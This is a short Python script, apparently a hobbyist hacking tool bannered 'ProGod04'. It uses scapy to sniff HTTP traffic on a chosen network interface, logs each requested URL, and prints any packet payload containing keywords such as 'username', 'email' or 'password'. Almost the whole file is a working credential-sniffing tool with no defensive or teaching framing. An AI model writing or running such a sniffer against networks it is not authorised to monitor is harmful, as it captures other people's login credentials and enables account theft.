import scapy.all as scapy
from pyfiglet import Figlet
from scapy.layers import http

fig = Figlet(font='greek')
print(fig.renderText("ProGod04"))

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords =["username", "Login", "email", "password", "login", "pass", "user"] #You can add more keywords if you like to
        for i in keywords:
            if i in str(load):
                return load

def processed_packet(packet):
   
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Req --> " + url.decode())
        login_info = info(packet)
        if login_info:
            print("\n\n[+]Usernames/Passwords -->" + login_info.decode() + "\n\n")

interface=input("Enter the Interface you want to sniff traffic on : \n")
print("[+] Started Sniffing on --> " + interface + "\n Hit CTRL+C to exit out of the sniffer" )
sniff(interface)
